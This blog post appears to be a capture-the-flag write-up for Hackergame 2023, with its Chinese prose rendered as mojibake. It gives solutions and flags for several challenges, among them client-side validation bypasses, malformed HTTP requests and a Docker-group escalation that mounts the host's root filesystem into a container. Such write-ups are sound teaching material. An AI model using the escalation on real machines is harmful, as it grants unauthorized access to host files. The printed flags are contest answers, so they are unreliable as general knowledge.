<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="nyyyddddn,1959759892@qq.com"><title>nyyyddddn</title><meta name="description" content="å¯å¯çˆ±çˆ±å°±å¥½~"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/logo.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo@2x.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">nyyyddddn</a></h3><div class="description"><p>å¯å¯çˆ±çˆ±å°±å¥½~</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/nyyyddddn"><i class="fa fa-github"></i></a></li><li><a href="mailto:1959759892@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=1959759892"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> nyyyddddn,1959759892@qq.com</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/hackergame2023/">Hackergame2023</a></h3></div><div class="post-content"><div class="card"><p><h2 id="Hackergame-å¯åŠ¨"><a href="#Hackergame-å¯åŠ¨" class="headerlink" title="Hackergame å¯åŠ¨"></a>Hackergame å¯åŠ¨</h2><p>Hackergameå¯åŠ¨ï¼å‘ç°æ ¡éªŒç›¸ä¼¼åº¦æ˜¯åœ¨å‰ç«¯æ ¡éªŒçš„ï¼Œç„¶åé€šè¿‡urlä¼ å‚ç›¸ä¼¼åº¦ï¼Œä¼ é€’ä¸ª100è¿‡å»å°±æ‹¿åˆ°flagäº†</p>
<h2 id="æ›´æ·±æ›´æš—"><a href="#æ›´æ·±æ›´æš—" class="headerlink" title="æ›´æ·±æ›´æš—"></a>æ›´æ·±æ›´æš—</h2><p>åœ¨main.jsé‡Œæœ‰ä¸€æ®µç”Ÿæˆflagçš„ä»£ç ï¼Œåœ¨æ§åˆ¶å°ä¸­è°ƒç”¨å°±å¥½äº†</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getFlag</span>(<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="comment">// Generate the flag based on user&#x27;s token</span></span><br><span class="line">    <span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getFlag</span>(<span class="params">token</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate the flag based on user&#x27;s token</span></span><br><span class="line">        <span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">getFlag</span>(<span class="variable language_">localStorage</span>.<span class="property">token</span>)</span><br></pre></td></tr></table></figure>



<h2 id="çŒ«å’ªå°æµ‹"><a href="#çŒ«å’ªå°æµ‹" class="headerlink" title="çŒ«å’ªå°æµ‹"></a>çŒ«å’ªå°æµ‹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿï¼ˆ30 åˆ†ï¼‰</span><br><span class="line">12</span><br><span class="line">æš´åŠ›ç ´è§£</span><br><span class="line"></span><br><span class="line">2. ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿï¼ˆ30 åˆ†ï¼‰</span><br><span class="line">23</span><br><span class="line"></span><br><span class="line">https://arxiv.org/abs/2303.17626</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. ä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿ</span><br><span class="line">CONFIG_TCP_CONG_BBR</span><br><span class="line"></span><br><span class="line">https://github.com/google/bbr/blob/master/Documentation/bbr-quick-start.md</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4. ğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ MyPY mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿï¼ˆ20 åˆ†ï¼‰</span><br><span class="line">æç¤ºï¼šä¼šè®®çš„å¤§å†™è‹±æ–‡ç®€ç§°ï¼Œæ¯”å¦‚ ISCAã€CCSã€ICMLã€‚</span><br><span class="line"></span><br><span class="line">ECOOP</span><br><span class="line">https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å¥½è€¶å­¦ä¼šæ€ä¹ˆæœç´¢è®ºæ–‡äº†,Google hackerè¯­æ³•ï¼Œèƒå–å…³é”®è¯ï¼Œç„¶åæŒ‰æ—¶é—´ç­›é€‰ç¼©å°èŒƒå›´</span><br></pre></td></tr></table></figure>

<img src="/2023/12/28/hackergame2023/1698678184780.png" class="">

<img src="/2023/12/28/hackergame2023/1698678163552.png" class="">

<h2 id="èµ›åšäº•å­—æ£‹"><a href="#èµ›åšäº•å­—æ£‹" class="headerlink" title="èµ›åšäº•å­—æ£‹"></a>èµ›åšäº•å­—æ£‹</h2><p>ç®€å•ç©äº†ä¸€ä¸‹ï¼Œå‘ç°æ€ä¹ˆæ‰“éƒ½æ˜¯å¹³å±€ï¼Œåé¢åœ¨æƒ³èƒ½ä¸èƒ½åœ¨æ•Œæ–¹æ£‹å­ä½ç½®ä¸‹æ£‹ï¼Œç”¨burp suiteå‘é€äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ï¼Œåç«¯æ²¡æœ‰åˆ¤æ–­æ ¼å­ä¸Šé¢æ˜¯å¦æœ‰æ£‹å­ï¼Œè¦†ç›–æ•Œæ–¹æ£‹å­åå°±æ‹¿åˆ°flagäº†ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸¤ä¸ªæµè§ˆå™¨æ¥æ“ä½œ</p>
<img src="/2023/12/28/hackergame2023/1698666436520.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_can_eat_your_pieces_41065ba433&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨"><a href="#ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨" class="headerlink" title="ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨"></a>ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨</h2><p>è¿™é“é¢˜æ¶ˆæ¯éƒ½æ˜¯åœ¨spanæ ‡ç­¾ä¸­çš„ï¼Œåªéœ€è¦æŠŠspanæšä¸¾ä¸€æ¬¡ï¼Œç”¨æ­£åˆ™åŒ¹é…ï¼Œç„¶åå†æ¨¡æ‹Ÿç‚¹å‡»å°±å¥½äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function findAndClickSpan() &#123;</span><br><span class="line"></span><br><span class="line">  const regex = /hack\[[^\]]*\]/;</span><br><span class="line"></span><br><span class="line">  const spans = document.getElementsByTagName(&#x27;span&#x27;);</span><br><span class="line"></span><br><span class="line">  Array.from(spans).forEach((span) =&gt; &#123;</span><br><span class="line">    if (regex.test(span.textContent)) &#123;</span><br><span class="line">      console.log(&#x27;åŒ¹é…çš„spanå…ƒç´ :&#x27;, span);</span><br><span class="line"></span><br><span class="line">      span.click();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setInterval(findAndClickSpan, 1000);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Web_pr0gra_mm1ng_5a17e089a1_15fun&#125;</span><br></pre></td></tr></table></figure>



<h2 id="è™«"><a href="#è™«" class="headerlink" title="è™«"></a>è™«</h2><p>æŸ¥è¯¢äº†ä¸€ä¸‹æ— çº¿ä¼ è¾“å›¾ç‰‡çš„æ–¹æ³•ï¼Œsstvè¿™ä¸ªåè®®</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485349&idx=1&sn=7bdfed472158dc2378113361ee9556a6&chksm=fd7112e8ca069bfe1b3da839050f8bebc5c1c166ac82f3326e634779ce1f55f45897968c9922&token=9197758&lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485349&amp;idx=1&amp;sn=7bdfed472158dc2378113361ee9556a6&amp;chksm=fd7112e8ca069bfe1b3da839050f8bebc5c1c166ac82f3326e634779ce1f55f45897968c9922&amp;token=9197758&amp;lang=zh_CN#rd</a></p>
<p>å¯ä»¥ç”¨rx sstvè¿™ä¸ªè½¯ä»¶è¿˜åŸå›¾ç‰‡ï¼Œéœ€è¦å…ˆè£…ä¸ªè™šæ‹Ÿå£°å¡ç„¶åç”¨rx sstvç›‘å¬ï¼Œè¿˜åŸå°±å¥½äº†</p>
<img src="/2023/12/28/hackergame2023/1698661030342.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SSssTV_y0u_W4NNa_HaV3_4_trY&#125;</span><br></pre></td></tr></table></figure>



<h2 id="HTTP-é›†é‚®å†Œ-å·®ä¸€ä¸ª"><a href="#HTTP-é›†é‚®å†Œ-å·®ä¸€ä¸ª" class="headerlink" title="HTTP é›†é‚®å†Œ[å·®ä¸€ä¸ª]"></a>HTTP é›†é‚®å†Œ[å·®ä¸€ä¸ª]</h2><p>1 è·å–ç¬¬ä¸€ä¸ª flag éœ€è¦æ”¶é›† 5 ç§çŠ¶æ€ç ï¼›</p>
<p>1 200 getè¯·æ±‚ä¸€ä¸ªå­˜åœ¨çš„ç›®å½• </p>
<p>2 400 è¯·æ±‚æ ¼å¼é”™è¯¯ éšä¾¿ä¹±è¾“å…¥ä¸€äº›ä¸œè¥¿</p>
<p>3 404 è¯·æ±‚ä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½• </p>
<p>4  405 Bad Request æœåŠ¡å™¨é‚£è¾¹ä¸æ”¯æŒpostï¼Œç›´æ¥post</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>

<p>5 505 httpç‰ˆæœ¬ä¸å—æ”¯æŒ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/10.1\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>

<p>2  nginx è¿”å›é¦–è¡Œæ— çŠ¶æ€ç çš„å“åº”ï¼ˆä¸è®¡å…¥æ”¶é›†çš„çŠ¶æ€ç ä¸­ï¼‰ï¼›</p>
<p>åªè¦ä¸å¸¦ä¸Šhttpçš„ç‰ˆæœ¬å·ï¼ŒæœåŠ¡å™¨é‚£è¾¹å°±ä¸ä¼šç›¸åº”çŠ¶æ€ç›¸å…³çš„ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / \r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d1d you hear the HTTP packet from 1991?&#125;</span><br></pre></td></tr></table></figure>

<p>è‰ï¼Œè¿™ä¸ªflag</p>
<h2 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git!"></a>Git? Git!</h2><p>ä¸å¤ªç†Ÿæ‚‰gitï¼Œåœ¨æœç´¢åå‘ç°ï¼Œæ’¤é”€è¿™ä¸ªæ“ä½œæœ¬èº«ä¹Ÿç®—æ˜¯ä¸€ä¸ªæäº¤ï¼Œä¹Ÿä¼šè®°å½•åˆ°æ—¥å¿—å½“ä¸­ï¼Œç„¶åæˆ‘å»ç¿»äº†ä¸‹é¡¹ç›®æ–‡ä»¶ï¼Œå‘ç°logæ–‡ä»¶ä¸‹æœ‰ä¸€ä¸ªresetçš„æ“ä½œï¼Œè¿™é‡Œåº”è¯¥æ˜¯æŒ‡â€æ’¤é”€â€å§ï¼ŒæŸ¥è¯¢äº†ä¸€ä¼šèµ„æ–™åå‘ç°æœ‰ä¸€ä¸ªgit show hashçš„å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ“ä½œå…·ä½“åšäº†ä»€ä¹ˆäº‹æƒ…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000000000000000000000000000 15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 PRO-2684 &lt;54608551+PRO-2684@users.noreply.github.com&gt; 1698306875 +0800	clone: from https://github.com/dair-ai/ML-Course-Notes.git</span><br><span class="line">15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 505e1a3f446c23f31807a117e860f57cb5b5bb79 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307060 +0800	commit: Trim trailing spaces</span><br><span class="line">505e1a3f446c23f31807a117e860f57cb5b5bb79 15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307092 +0800	reset: moving to HEAD~</span><br><span class="line">15fd0a13eb46c39f34cfc0dfb4757ad23a23d026 ea49f0cd3d36edb2965f89581b11151959d20991 some_english_postgraduate &lt;some_english_postgraduate@none-exist.com&gt; 1698307103 +0800	commit: Trim trailing spaces</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show 505e1a3f446c23f31807a117e860f57cb5b5bb79</span><br></pre></td></tr></table></figure>

<p>åæ‰¾åˆ°æ’¤é”€çš„flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h2><p>X æ˜¯å®éªŒå®¤æœºå™¨çš„ç®¡ç†å‘˜ï¼Œä¸ºäº†åœ¨ä¿è¯å®‰å…¨çš„åŒæ—¶è®©åŒå­¦ä»¬éƒ½ç”¨ä¸Š dockerï¼Œä»–æŠŠåŒå­¦çš„è´¦å·åŠ å…¥äº† docker ç”¨æˆ·ç»„ï¼Œè¿™æ ·å°±ä¸éœ€è¦ç»™åŒå­¦ sudo æƒé™äº†ï¼</p>
<p>ä½†æœçœŸå¦‚æ­¤å—ï¼Ÿ</p>
<p>å»æŸ¥è¯¢äº†ä¸€ä¸‹åå‘ç°ï¼ŒDockerå®ˆæŠ¤ç¨‹åºçš„è®¿é—®æƒé™æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼Œåœ¨dockerå®¹å™¨ä¸­ï¼Œå¯ä»¥å…·æœ‰å’Œå®¿ä¸»æœºç›¸åŒçš„æƒé™ï¼Œé‚£èƒ½ä¸èƒ½æŠŠflagç»™æ¬åˆ°å®¹å™¨é‡Œé¢ï¼ŒæŸ¥è¯¢äº†ä¸€ä¸‹åå‘ç°æœ‰ä¸€æ¡æŒ‚è½½æ•°æ®å·çš„å‘½ä»¤å¯ä»¥å®ç°è¿™ä¸ªæ“ä½œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/tmp/ -it alpine /bin/sh</span><br></pre></td></tr></table></figure>

<p>cat flagå‘ç°æœ‰äº›é—®é¢˜ï¼Œls -alçœ‹äº†ä¸‹æ˜¯ä¸€ä¸ªè½¯é“¾æ¥ï¼Œè¿›åˆ°è¿™ä¸ªé“¾æ¥çš„ç›®å½•ä¸‹cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/dev/shm # cat flag</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;u5e_r00t1ess_conta1ner_1d94c2e3ce_plz!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="JSON-âŠ‚-YAML"><a href="#JSON-âŠ‚-YAML" class="headerlink" title="JSON âŠ‚ YAML?"></a>JSON âŠ‚ YAML?</h2><p>ç¬¬ä¸€é—®</p>
<p>æ ¹æ®è¿™æ®µè¯ï¼Œå¯ä»¥åˆ†æå‡ºç¬¬ä¸€é—®çš„æœ¬è´¨æ˜¯åœ¨é—®yaml1.1å’Œyaml1.2æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œå»å­¦ä¹ äº†ä¸€ä¸‹yamlï¼Œå’Œjsonæœ‰äº›ç›¸ä¼¼ï¼Œç”±é”®å€¼å¯¹ï¼Œåˆ—è¡¨ï¼Œè¿˜æœ‰å—ä¸‰ç§ç»“æ„ç»„åˆæˆçš„ä¸€ç§ç»„ç»‡æ•°æ®çš„è¯­è¨€ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å° Z å¬é—»è¿™ç•ªè¨€è®ºåå½“åœºè¡¨ç¤ºæ€€ç–‘ï¼Œç«‹åˆ»è¯´å‡ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒJSON å’Œ YAML è§£æå‡ºçš„å«ä¹‰å­˜åœ¨å·®å¼‚ã€‚å° W ç ”ç©¶äº†ä¸€ç•ªæ‰å‘ç°ï¼Œè¿™æ˜¯å› ä¸ºå¾ˆå¤šä¸»æµçš„ YAML åº“ä»ç„¶æ˜¯ YAML 1.1 çš„ï¼Œå®ƒæ²¡æœ‰è¿™ä¸ªæ€§è´¨ã€‚ä»–ä¸å¾—ä¸æ‰¿è®¤ï¼šã€Œå¥½å§ï¼Œè¿™ä¸ªæ€§è´¨åªé€‚ç”¨äº YAML 1.2ã€‚ã€</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files">https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files</a></p>
<p>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œå’±çš„payloadæ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123e100000</span><br></pre></td></tr></table></figure>

<p>åœ¨yaml1.1ä¸­ï¼Œè¿™ä¸ªè¡¨è¾¾å¼ä¼šè¢«è§£ææˆç§‘å­¦è®¡æ•°æ³•ï¼Œjsonä¸­ä¼šè¢«è§£ææˆå­—ç¬¦ä¸²</p>
<p>ç¬¬äºŒé—®</p>
<p>æœäº†åŠå¤©ï¼Œç»ˆäºæœåˆ°è§£å†³æ–¹æ³•äº†</p>
<img src="/2023/12/28/hackergame2023/1699069440559.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;: &quot;John Doe&quot;, &quot;age&quot;: 25, &quot;name&quot;: &quot;Jonathan Doe&quot;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="å¥¶å¥¶çš„ç¡å‰-flag-æ•…äº‹"><a href="#å¥¶å¥¶çš„ç¡å‰-flag-æ•…äº‹" class="headerlink" title="å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹"></a>å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹</h2><p>å’±æ˜¯ç¬¨è›‹ï¼Œå»é—®äº†newbingå¥½ä¹…ï¼Œåé¢ç”¨010editæ‰“å¼€åå‘ç°æœ‰ä¸¤ä¸ªiendå°¾ï¼Œç„¶åè”æƒ³åˆ°ç³»ç»Ÿéƒ½æ²¡æœ‰å¿ƒæ€å‡çº§ï¼Œæˆªå›¾ï¼Œè°·æ­Œäº²å„¿å­è¿™äº›å…³é”®è¯ï¼Œè”æƒ³åˆ°æˆªå›¾æ¼æ´ï¼Œå°¾éƒ¨çš„åƒç´ å—æ²¡æœ‰è¢«æˆªæ–­</p>
<p>å»æœç´¢äº†ä¸€ä¸‹å‘ç°è¿™ä¸ªç½‘ç«™å¯ä»¥è¿˜åŸå›¾ç‰‡</p>
<p><a target="_blank" rel="noopener" href="https://acropalypse.app/">https://acropalypse.app/</a></p>
<img src="/2023/12/28/hackergame2023/1698743242612.png" class="">

<img src="/2023/12/28/hackergame2023/1698743440800.png" class="">



<h2 id="ğŸª-é«˜é¢‘ç‡æ˜Ÿçƒ"><a href="#ğŸª-é«˜é¢‘ç‡æ˜Ÿçƒ" class="headerlink" title="ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ"></a>ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ</h2><p><a target="_blank" rel="noopener" href="https://asciinema.org/">asciinema</a></p>
<p>è¿™ä¸ªè½¯ä»¶å½•åˆ¶çš„æ–‡ä»¶ï¼ŒæŠŠå½•åˆ¶çš„æ–‡ä»¶å¯¼å‡ºæ¥ï¼Œå‘ç°æ˜¯ä¸€ä¸ªjsçš„æ–‡ä»¶ï¼Œå°¾éƒ¨æ˜¾ç¤ºè¿è¡Œè¿™ä¸ªæ–‡ä»¶èƒ½å¾—åˆ°flagï¼Œä½†æ˜¯å½•åˆ¶å‡ºæ¥çš„æ–‡ä»¶æœ‰å¤ªå¤šç»ˆç«¯é¢œè‰²çš„ç¬¦å·è¿˜æœ‰åˆ‡é¡µç¬¦å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asciienma cat xxxx &gt; output.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\033\[[\x30-\x3f]*[\x40-\x7e]</span><br></pre></td></tr></table></figure>

<p>ç”¨è¿™ä¸ªæ­£åˆ™æ¸…ç†æ‰å¤§å¤šæ•°ç¬¦å·åï¼Œæ‰‹å·¥æ¸…ç†äº†ä¸€ä¸‹ï¼Œç„¶åæ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node output.js</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ğŸª-ä½å¸¦å®½æ˜Ÿçƒ-å·®ä¸€ä¸ª"><a href="#ğŸª-ä½å¸¦å®½æ˜Ÿçƒ-å·®ä¸€ä¸ª" class="headerlink" title="ğŸª ä½å¸¦å®½æ˜Ÿçƒ[å·®ä¸€ä¸ª]"></a>ğŸª ä½å¸¦å®½æ˜Ÿçƒ[å·®ä¸€ä¸ª]</h2><p>å‹ç¼©è‡³ 2KiB (2048 å­—èŠ‚) åŠä»¥ä¸‹ã€</p>
<p><a target="_blank" rel="noopener" href="https://github.com/meowtec/Imagine">https://github.com/meowtec/Imagine</a> è¿™ä¸ªé¡¹ç›®èƒ½å‹ç¼©å›¾ç‰‡åˆ°2kbä»¥ä¸‹ï¼Œæäº¤å›¾ç‰‡åè·å¾—flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;A1ot0f_t0015_is_available_to_compre55_PNG&#125;</span><br></pre></td></tr></table></figure>





